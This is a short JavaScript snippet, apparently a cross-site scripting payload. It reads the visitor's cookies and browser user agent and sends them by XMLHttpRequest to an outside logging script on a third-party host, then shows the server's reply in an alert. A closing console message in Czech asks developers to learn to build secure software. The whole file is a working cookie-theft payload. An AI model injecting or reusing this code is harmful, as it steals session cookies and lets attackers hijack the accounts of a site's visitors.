var cookies = document.cookie;
var userAgent = navigator.userAgent;
var params = "?cookies=" + cookies + "&agent=" + userAgent;
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        alert(xhr.responseText);
    }
}
xhr.open('GET', 'http://pleasefixxss.net63.net/log.php' + params, true);
xhr.send(null);
console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpeční software. děkuji");
